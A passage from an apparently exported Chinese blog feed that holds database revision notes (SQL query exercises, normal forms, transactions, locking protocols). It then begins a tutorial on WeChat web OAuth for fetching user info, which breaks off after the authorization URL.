<h5 id="2-5-2-2．查询选修课程名为数据库的学生学号与姓名"><a href="#2-5-2-2．查询选修课程名为数据库的学生学号与姓名" class="headerlink" title="2.5.2.2．查询选修课程名为数据库的学生学号与姓名"></a>2.5.2.2．查询选修课程名为数据库的学生学号与姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.Sno, S.Sname</span><br><span class="line"><span class="keyword">from</span> S, SC, C</span><br><span class="line"><span class="keyword">where</span> S.Sno<span class="operator">=</span>SC.Sno <span class="keyword">and</span> SC.Cno<span class="operator">=</span>C.Cno <span class="keyword">and</span> C.Cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-3．查询不选1号课程的学生学号与姓名"><a href="#2-5-2-3．查询不选1号课程的学生学号与姓名" class="headerlink" title="2.5.2.3．查询不选1号课程的学生学号与姓名"></a>2.5.2.3．查询不选1号课程的学生学号与姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> S.sno, S.sname</span><br><span class="line"><span class="keyword">from</span> S)</span><br><span class="line">minus</span><br><span class="line">(<span class="keyword">select</span> S.sno, S.sname</span><br><span class="line"><span class="keyword">from</span> S, SC</span><br><span class="line"><span class="keyword">where</span> S.sno<span class="operator">=</span>SC.sno <span class="keyword">and</span> SC.cno<span class="operator">=</span><span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-4．查询学习全部课程学生姓名"><a href="#2-5-2-4．查询学习全部课程学生姓名" class="headerlink" title="2.5.2.4．查询学习全部课程学生姓名"></a>2.5.2.4．查询学习全部课程学生姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Sname <span class="keyword">from</span> S <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span> (</span><br><span class="line">   <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> C <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span> (</span><br><span class="line">      <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> SC <span class="keyword">where</span> Sno<span class="operator">=</span>S.Sno <span class="keyword">and</span> Cno<span class="operator">=</span>C.Cno));</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-5．查询所有学生除了选修1号课程外所有成绩均及格的学生的学号和平均成绩，其结果按平均成绩的降序排列"><a href="#2-5-2-5．查询所有学生除了选修1号课程外所有成绩均及格的学生的学号和平均成绩，其结果按平均成绩的降序排列" class="headerlink" title="2.5.2.5．查询所有学生除了选修1号课程外所有成绩均及格的学生的学号和平均成绩，其结果按平均成绩的降序排列"></a>2.5.2.5．查询所有学生除了选修1号课程外所有成绩均及格的学生的学号和平均成绩，其结果按平均成绩的降序排列</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, <span class="built_in">avg</span>(grade) <span class="keyword">from</span> (</span><br><span class="line">   <span class="keyword">select</span> S.sno, SC.grade <span class="keyword">from</span> S, SC</span><br><span class="line">   <span class="keyword">where</span> S.sno<span class="operator">=</span>SC.sno <span class="keyword">and</span> SC.cno<span class="operator">!=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span> (</span><br><span class="line">      <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> SC <span class="keyword">where</span> sno<span class="operator">=</span>S.sno <span class="keyword">and</span> cno<span class="operator">!=</span><span class="number">1</span> <span class="keyword">and</span> grade<span class="operator">&lt;</span><span class="number">60</span></span><br><span class="line">   )</span><br><span class="line">)</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">avg</span>(grade) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-6．查询选修数据库成绩第2名的学生姓名"><a href="#2-5-2-6．查询选修数据库成绩第2名的学生姓名" class="headerlink" title="2.5.2.6．查询选修数据库成绩第2名的学生姓名"></a>2.5.2.6．查询选修数据库成绩第2名的学生姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.sname, SC.grade</span><br><span class="line"><span class="keyword">from</span> S, SC, C</span><br><span class="line"><span class="keyword">where</span> S.sno<span class="operator">=</span>SC.sno <span class="keyword">and</span> C.cno<span class="operator">=</span>SC.cno <span class="keyword">and</span> C.cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span> <span class="keyword">and</span> SC.grade <span class="keyword">in</span> (</span><br><span class="line">   <span class="keyword">select</span> <span class="built_in">max</span>(SC.grade)</span><br><span class="line">   <span class="keyword">from</span> SC, C</span><br><span class="line">   <span class="keyword">where</span> C.cno<span class="operator">=</span>SC.cno <span class="keyword">and</span> C.cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span> <span class="keyword">and</span> SC.grade <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">      <span class="keyword">select</span> <span class="built_in">max</span>(SC.grade)</span><br><span class="line">      <span class="keyword">from</span> SC, C</span><br><span class="line">      <span class="keyword">where</span> C.cno<span class="operator">=</span>SC.cno <span class="keyword">and</span> C.cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span></span><br><span class="line">   )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-7-查询所有3个学分课程中有3门以上（含3门）课程获80分以上（含80分）的学生的姓名"><a href="#2-5-2-7-查询所有3个学分课程中有3门以上（含3门）课程获80分以上（含80分）的学生的姓名" class="headerlink" title="2.5.2.7. 查询所有3个学分课程中有3门以上（含3门）课程获80分以上（含80分）的学生的姓名"></a>2.5.2.7. 查询所有3个学分课程中有3门以上（含3门）课程获80分以上（含80分）的学生的姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> S.sname, <span class="built_in">count</span>(SC.cno)</span><br><span class="line"><span class="keyword">from</span> S, SC, C</span><br><span class="line"><span class="keyword">where</span> S.sno<span class="operator">=</span>SC.sno <span class="keyword">and</span> SC.cno<span class="operator">=</span>C.cno <span class="keyword">and</span> C.ccredit<span class="operator">=</span><span class="number">3</span> <span class="keyword">and</span> SC.grade<span class="operator">&gt;=</span><span class="number">80</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> S.sname</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">count</span>(SC.cno)<span class="operator">&gt;=</span><span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-8-查询选课门数唯一的学生的学号"><a href="#2-5-2-8-查询选课门数唯一的学生的学号" class="headerlink" title="2.5.2.8. 查询选课门数唯一的学生的学号"></a>2.5.2.8. 查询选课门数唯一的学生的学号</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (</span><br><span class="line">   <span class="keyword">select</span> sno, <span class="built_in">count</span>(cno) ccount</span><br><span class="line">   <span class="keyword">from</span> SC</span><br><span class="line">   <span class="keyword">group</span> <span class="keyword">by</span> sno</span><br><span class="line">) SC_count1</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span> (</span><br><span class="line">   <span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line">   <span class="keyword">from</span> (</span><br><span class="line">      <span class="keyword">select</span> sno, <span class="built_in">count</span>(cno) ccount</span><br><span class="line">      <span class="keyword">from</span> SC</span><br><span class="line">      <span class="keyword">group</span> <span class="keyword">by</span> sno</span><br><span class="line">   ) SC_count2</span><br><span class="line">   <span class="keyword">where</span> sno<span class="operator">!=</span>SC_count1.sno <span class="keyword">and</span> ccount<span class="operator">=</span>SC_count1.ccount</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-2-9-SELECT语句中各种查询条件的实验"><a href="#2-5-2-9-SELECT语句中各种查询条件的实验" class="headerlink" title="2.5.2.9. SELECT语句中各种查询条件的实验"></a>2.5.2.9. SELECT语句中各种查询条件的实验</h5><ul>
<li><code>between</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Sno, Sname, Sage <span class="keyword">from</span> S <span class="keyword">where</span> Sage <span class="keyword">between</span> <span class="number">19</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>in</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Sno, Sname, Sdept <span class="keyword">from</span> S <span class="keyword">where</span> Sdept <span class="keyword">in</span> (<span class="string">&#x27;CS&#x27;</span>, <span class="string">&#x27;IS&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>like</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Sno, Sname, Ssex <span class="keyword">from</span> S <span class="keyword">where</span> Sname <span class="keyword">like</span> <span class="string">&#x27;刘%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>is NULL</code> &#x2F; <code>is not NULL</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> C <span class="keyword">where</span> Cpno <span class="keyword">is</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> C <span class="keyword">where</span> Cpno <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt; any</code> &#x2F; <code>&gt;= all</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> SC <span class="keyword">where</span> grade <span class="operator">&lt;</span> <span class="keyword">any</span> (<span class="keyword">select</span> grade <span class="keyword">from</span> SC);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> SC <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="keyword">all</span> (<span class="keyword">select</span> grade <span class="keyword">from</span> SC);</span><br></pre></td></tr></table></figure>

<h4 id="2-5-3-数据修改、删除"><a href="#2-5-3-数据修改、删除" class="headerlink" title="2.5.3. 数据修改、删除"></a>2.5.3. 数据修改、删除</h4><h5 id="2-5-3-1-把1号课程的非空成绩提高10％"><a href="#2-5-3-1-把1号课程的非空成绩提高10％" class="headerlink" title="2.5.3.1. 把1号课程的非空成绩提高10％"></a>2.5.3.1. 把1号课程的非空成绩提高10％</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> SC <span class="keyword">set</span> grade<span class="operator">=</span>grade<span class="operator">*</span><span class="number">1.1</span> <span class="keyword">where</span> cno<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> grade <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-3-2-在SC表中删除课程名为数据库的成绩的元组"><a href="#2-5-3-2-在SC表中删除课程名为数据库的成绩的元组" class="headerlink" title="2.5.3.2. 在SC表中删除课程名为数据库的成绩的元组"></a>2.5.3.2. 在SC表中删除课程名为数据库的成绩的元组</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> SC <span class="keyword">where</span> cno <span class="keyword">in</span> (</span><br><span class="line">   <span class="keyword">select</span> cno <span class="keyword">from</span> C <span class="keyword">where</span> cname<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-3-3-在S和SC表中删除学号为201215121的所有数据"><a href="#2-5-3-3-在S和SC表中删除学号为201215121的所有数据" class="headerlink" title="2.5.3.3. 在S和SC表中删除学号为201215121的所有数据"></a>2.5.3.3. 在S和SC表中删除学号为201215121的所有数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> SC <span class="keyword">where</span> sno<span class="operator">=</span><span class="number">201215121</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> S <span class="keyword">where</span> sno<span class="operator">=</span><span class="number">201215121</span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-5-4-视图的操作"><a href="#2-5-4-视图的操作" class="headerlink" title="2.5.4. 视图的操作"></a>2.5.4. 视图的操作</h4><h5 id="2-5-4-1-建立男学生的视图，属性包括学号、姓名、选修课程名和成绩"><a href="#2-5-4-1-建立男学生的视图，属性包括学号、姓名、选修课程名和成绩" class="headerlink" title="2.5.4.1. 建立男学生的视图，属性包括学号、姓名、选修课程名和成绩"></a>2.5.4.1. 建立男学生的视图，属性包括学号、姓名、选修课程名和成绩</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> S_SC_C_man</span><br><span class="line"><span class="keyword">as</span></span><br><span class="line"><span class="keyword">select</span> S.sno, S.sname, C.cname, SC.grade</span><br><span class="line"><span class="keyword">from</span> S, SC, C</span><br><span class="line"><span class="keyword">where</span> S.sno<span class="operator">=</span>SC.sno <span class="keyword">and</span> SC.cno<span class="operator">=</span>C.cno;</span><br></pre></td></tr></table></figure>

<h5 id="2-5-4-2-在男学生视图中查询平均成绩大于80分的学生学号与姓名"><a href="#2-5-4-2-在男学生视图中查询平均成绩大于80分的学生学号与姓名" class="headerlink" title="2.5.4.2. 在男学生视图中查询平均成绩大于80分的学生学号与姓名"></a>2.5.4.2. 在男学生视图中查询平均成绩大于80分的学生学号与姓名</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sno, sname</span><br><span class="line"><span class="keyword">from</span> S_SC_C_man</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> sno,sname</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">avg</span>(grade)<span class="operator">&gt;</span><span class="number">80</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-关系数据库理论-范式"><a href="#3-关系数据库理论-范式" class="headerlink" title="3. 关系数据库理论 - 范式"></a>3. 关系数据库理论 - 范式</h2><p>关系数据理论主要讨论：如何设计一个好的数据库模式，即如何构造一个好的数据表。主要方法是：使用范式对表进行规范化。</p>
<p>在引出范式之前，需要讨论一下数据依赖和码的概念。</p>
<h3 id="3-1-数据依赖"><a href="#3-1-数据依赖" class="headerlink" title="3.1. 数据依赖"></a>3.1. 数据依赖</h3><p>数据依赖是一个关系内部属性与属性之间的一种约束关系，其中最重要的是：</p>
<ul>
<li><strong>函数依赖（FD）</strong></li>
<li><strong>多值依赖（MVD）</strong></li>
</ul>
<h4 id="3-1-1-函数依赖"><a href="#3-1-1-函数依赖" class="headerlink" title="3.1.1. 函数依赖"></a>3.1.1. 函数依赖</h4><p>函数依赖：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/9.png" alt="1"></p>
<p>完全函数依赖、部分函数依赖、传递函数依赖：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/10.png" alt="1"></p>
<h4 id="3-1-2-多值依赖"><a href="#3-1-2-多值依赖" class="headerlink" title="3.1.2. 多值依赖"></a>3.1.2. 多值依赖</h4><p>示例：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/11.png" alt="1"></p>
<p>定义：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/12.png" alt="1"></p>
<h3 id="3-2-码"><a href="#3-2-码" class="headerlink" title="3.2. 码"></a>3.2. 码</h3><p>候选码、超码、主码、全码：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/13.png" alt="1"></p>
<p><strong>注意：所有属性都完全函数依赖于候选码</strong>。</p>
<p>外码：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/14.png" alt="1"></p>
<h3 id="3-3-第一范式-1NF"><a href="#3-3-第一范式-1NF" class="headerlink" title="3.3. 第一范式 - 1NF"></a>3.3. 第一范式 - 1NF</h3><p>定义：<strong>每个属性必须是不可分的数据项</strong>。</p>
<p>第一范式是关系的基本条件。</p>
<h3 id="3-4-第二范式-2NF"><a href="#3-4-第二范式-2NF" class="headerlink" title="3.4. 第二范式 - 2NF"></a>3.4. 第二范式 - 2NF</h3><p>定义：**若关系模式 $R \in 1NF$，且每一个非主属性完全函数依赖于任何一个候选码，则 $R \in 2NF$**。</p>
<p>简而言之：<strong>不存在非主属性对码的部分函数依赖</strong>。</p>
<h3 id="3-5-第三范式-3NF"><a href="#3-5-第三范式-3NF" class="headerlink" title="3.5. 第三范式 - 3NF"></a>3.5. 第三范式 - 3NF</h3><p>定义：**若关系模式 $R \in 1NF$，且不存在这样的码 $X$、属性组 $Y(Y \not\rightarrow X)$ 及非主属性 $Z(Z \not\subseteq Y)$，使得 $X \rightarrow Y, Y \rightarrow Z$ 成立，则 $R \in 3NF$**。</p>
<p>简而言之：<strong>不存在非主属性对码的函数传递依赖</strong>。</p>
<h3 id="3-6-BCNF"><a href="#3-6-BCNF" class="headerlink" title="3.6. BCNF"></a>3.6. BCNF</h3><p>定义：**关系模式$R \in 1NF$，若 $X \rightarrow Y$ 且 $Y \not\subseteq X$ 时 $X$ 必含有码，则$R \in BCNF$**。</p>
<h3 id="3-7-4NF"><a href="#3-7-4NF" class="headerlink" title="3.7. 4NF"></a>3.7. 4NF</h3><p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/16.png" alt="1"></p>
<h3 id="3-8-数据依赖的公理系统"><a href="#3-8-数据依赖的公理系统" class="headerlink" title="3.8. 数据依赖的公理系统"></a>3.8. 数据依赖的公理系统</h3><p>数据依赖的公理系统是模式分解算法的理论基础，下面介绍一个有效而完备的公理系统——Armstrong公理系统。</p>
<p>逻辑蕴含：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/17.png" alt="1"></p>
<p>Armstrong公理系统的推理规则：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/18.png" alt="1"><br><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/19.png" alt="1"></p>
<p>最小依赖集：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/20.png" alt="1"></p>
<h2 id="4-事务"><a href="#4-事务" class="headerlink" title="4. 事务"></a>4. 事务</h2><h3 id="4-1-基本概念"><a href="#4-1-基本概念" class="headerlink" title="4.1. 基本概念"></a>4.1. 基本概念</h3><p><strong>事务是用户定义的一个数据库操作序列，这些操作要么全做，要么全部做，是一个不可分割的单位</strong>。</p>
<p>事务通常以 <code>BEGIN TRANSACTION</code> 开始，以 <code>COMMIT</code>（提交，提交事务的所有操作）或 <code>ROLLBACK</code>（回滚，撤销事务中所有已完成的操作）结束。</p>
<h3 id="4-2-事务的ACID特性"><a href="#4-2-事务的ACID特性" class="headerlink" title="4.2. 事务的ACID特性"></a>4.2. 事务的ACID特性</h3><p>事务具有4个特性：</p>
<ul>
<li><p><strong>原子性（Atomicity）</strong>，事务中的所有操作要么都做，要么都不做。</p>
</li>
<li><p><strong>一致性（Consistency）</strong>，事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。如果数据库系统运行中发生故障，有些事务尚未完成就被迫中断，这些未完成的事务对数据库所做的修改有一部分已经写入物理数据库，这时数据库就处于不一致的状态。一致性与原子性密切相关。</p>
</li>
<li><p><strong>隔离性（Isolation）</strong>，一个事务的执行不能被其他事务干扰。</p>
</li>
<li><p><strong>持续性（Durability）</strong>，一个事务一旦提交，它对数据库中数据的改变就是永久性的，</p>
</li>
</ul>
<h2 id="5-并发控制"><a href="#5-并发控制" class="headerlink" title="5. 并发控制"></a>5. 并发控制</h2><p>事务是并发控制的基本单位，并发控制的目的即保证事务的<strong>隔离性和一致性</strong>。</p>
<p>并发控制的主要技术有：<strong>封锁（locking）</strong>、<strong>时间戳（timestamp）</strong>、<strong>乐观控制法（optimistic scheduler）</strong>和<strong>多版本并发控制（MVCC）</strong>。</p>
<p>其中，主要讲解基本的封锁方法。</p>
<h3 id="5-1-并发操作可能产生的问题"><a href="#5-1-并发操作可能产生的问题" class="headerlink" title="5.1. 并发操作可能产生的问题"></a>5.1. 并发操作可能产生的问题</h3><ul>
<li><p><strong>丢失修改（lost update，写与写冲突）</strong>：两个事务T1和T2读入同一个数据并修改，T2提交的结果破坏了T1提交的结果，导致T1的修改被丢失。</p>
</li>
<li><p><strong>脏读（dirty read，读到未提交写）</strong>：事务T1修改某一数据并将其写回磁盘，事务T2读取同一数据后，T1由于某种原因被撤销，此时T1修改过的数据恢复原值，T2读到的数据就与数据库中的数据不一致，为“脏数据”。</p>
</li>
<li><p><strong>不可重复读（non-repeatable）</strong>：</p>
<ol>
<li>事务T1读取某一数据后，T2对其进行<strong>修改</strong>，当T1再次都该数据时，得到与前一次不同的值。</li>
<li>事务T1按一定条件从数据库中读取了某些数据记录后，T2<strong>删除</strong>了其中部分记录，当T1再次读取时，发现某些记录神秘地消失了。</li>
<li>事务T1按一定条件从数据库中读取了某些数据记录后，T2<strong>插入</strong>了一些记录，当T1再次读取时，发现多了一些数据。</li>
</ol>
<ul>
<li>后两种不可重复读也被称为<strong>幻影（phantom row）现象&#x2F;幻读</strong>。</li>
</ul>
</li>
</ul>
<p>示例：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/21.png" alt="1"></p>
<h3 id="5-2-封锁"><a href="#5-2-封锁" class="headerlink" title="5.2. 封锁"></a>5.2. 封锁</h3><p>封锁就是：在对某个数据对象操作之前，先对其加锁。</p>
<p>主要有两种锁：</p>
<ul>
<li><strong>排他锁（X锁，写锁）</strong></li>
<li><strong>共享锁（S锁，读锁）</strong></li>
</ul>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/22.png" alt="1"></p>
<h3 id="5-3-封锁协议"><a href="#5-3-封锁协议" class="headerlink" title="5.3. 封锁协议"></a>5.3. 封锁协议</h3><p>运用X锁和S锁时，还需约定一些规则，例如：何时申请X锁或S锁、持锁时间、何时释放等，这些规则称为<strong>封锁协议（locking protocol）</strong>。</p>
<h4 id="5-3-1-一级封锁协议"><a href="#5-3-1-一级封锁协议" class="headerlink" title="5.3.1. 一级封锁协议"></a>5.3.1. 一级封锁协议</h4><p><strong>事务T在修改数据R之前必须对其加X锁，直到事务结束才释放</strong>。</p>
<p>一级封锁协议可<strong>防止丢失修改</strong>；但由于读数据不加锁，则<strong>不能保证脏读和可重复读</strong>。</p>
<h4 id="5-3-2-二级封锁协议"><a href="#5-3-2-二级封锁协议" class="headerlink" title="5.3.2. 二级封锁协议"></a>5.3.2. 二级封锁协议</h4><p><strong>在一级封锁协议的基础上，增加事务T在读取数据R之前必须先对其加S锁，读完后即可释放S锁</strong>。</p>
<p>二级封锁协议<strong>防止了丢失修复和脏读</strong>，但<strong>不能保证不可重复读</strong>。</p>
<h4 id="5-3-3-三级封锁协议"><a href="#5-3-3-三级封锁协议" class="headerlink" title="5.3.3. 三级封锁协议"></a>5.3.3. 三级封锁协议</h4><p><strong>在一级封锁协议的基础上，增加事务T在读取数据R之前必须先对其加S锁，直到事务结束才可释放S锁</strong>。</p>
<p>三级封锁协议<strong>防止了丢失修复、脏读和不可重复读</strong>。</p>
<h4 id="5-3-4-不同级别的封锁协议和一致性保证"><a href="#5-3-4-不同级别的封锁协议和一致性保证" class="headerlink" title="5.3.4. 不同级别的封锁协议和一致性保证"></a>5.3.4. 不同级别的封锁协议和一致性保证</h4><p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/23.png" alt="1"></p>
<h3 id="5-4-并发调度的可串行性"><a href="#5-4-并发调度的可串行性" class="headerlink" title="5.4. 并发调度的可串行性"></a>5.4. 并发调度的可串行性</h3><p>由于数据库事务是并发的，所以不同的事务调度可能会产生不同的结果，比如：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/24.png" alt="1"></p>
<p>那么什么样的调度是正确的呢？显然，<strong>串行调度</strong>是正确的，执行结果等价于串行调度结果的调度也是正确的，这样的调度叫做<strong>可串行化调度</strong>。</p>
<p>那么又如何判断一个调度是否为可串行化调度呢？</p>
<p>首先，需要引出：<strong>冲突操作</strong>是指不同事务对同一个数据的读写和写写操作，如下：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/25.png" alt="1"></p>
<p>在一个调度中，<strong>不同事务的冲突操作</strong>和<strong>同一事务的两个操作</strong>是不能交换的。</p>
<p>如果一个调度Sc，通过<strong>交换两个事务不冲突操作的次序</strong>，得到另一个调度Sc1，且Sc1是串行的，则称Sc为<strong>冲突可串行化调度</strong>，即可串行化调度。</p>
<p>举例：</p>
<p><img src="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E5%B0%8F%E8%AE%B0/26.png" alt="1"></p>
<h3 id="5-5-两段锁协议"><a href="#5-5-两段锁协议" class="headerlink" title="5.5. 两段锁协议"></a>5.5. 两段锁协议</h3><p>为了保证并发调度的正确性，数据库采用 <strong>两段锁协议（2PL）</strong> 实现并发调度的可串行性。</p>
<p>所谓两段锁，是指事务分为两个阶段：</p>
<ul>
<li><strong>第一阶段获得封锁，事务可以申请获得任何数据上的任何类型锁，但不能释放任何锁</strong>；</li>
<li><strong>第二阶段释放封锁，事务可以释放任何数据上的任何锁，但是不能再申请锁</strong>。</li>
</ul>
<p>事务遵守两段锁协议是可串行化调度的充分条件。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>微信网页获取用户信息(PHP、python实现)</title>
    <url>/%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>准备：</p>
<ul>
<li><p>微信认证公众号(要求企业才能认证)，或<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421137522">微信测试号(推荐)</a></p>
</li>
<li><p>PHP需要准备Apach服务器，python则准备Flask即可</p>
</li>
<li><p>调式工具：微信开发者工具(微信推出的IDE)</p>
</li>
<li><p>大致阅读微信公众平台文档中的<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421140842">微信网页授权</a></p>
</li>
</ul>
<p>在本文中，笔者将简述微信网页获取用户信息的三个主要步骤，并附上后端PHP&#x2F;python代码。</p>
<span id="more"></span>

<h2 id="1-PHP实现"><a href="#1-PHP实现" class="headerlink" title="1. PHP实现"></a>1. PHP实现</h2><h3 id="第一步：重定位到微信提供的接口，引导用户同意授权"><a href="#第一步：重定位到微信提供的接口，引导用户同意授权" class="headerlink" title="第一步：重定位到微信提供的接口，引导用户同意授权"></a>第一步：重定位到微信提供的接口，引导用户同意授权</h3><p>后端重定位跳转到微信提供的接口URL，即微信端的界面，此时会出现是否授权界面。用户同意授权后，微信服务器会跳转到参数中设置的<strong>回调地址</strong>，并携带code和state参数，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redirect_uri/?code=CODE&amp;state=STATE。</span><br></pre></td></tr></table></figure>

<p>此处，<strong>回调地址需要在公众号中配置</strong>。以测试公众号为例，在 体验<strong>接口权限表</strong> - <strong>网页服务</strong>类目 - <strong>网页授权获取用户基本信息</strong>接口 处点击修改，设置回调域名(或IP，测试号支持回调为IP地址)。</p>
<p><img src="/%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/1.png" alt="img"></p>
<p>实现第一个步骤，需要请求的接口如下(文档中也有)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://open.weixin.qq.com/connect/oauth2/authorize?appid=&#123;APPID&#125;&amp;redirect_uri=&#123;REDIRECT_URI&#125;&amp;response_type=code&amp;scope=&#123;SCOPE&#125;&amp;state=&#123;STATE&#125;#wechat_redirect</span><br></pre></td></tr></table></figure>

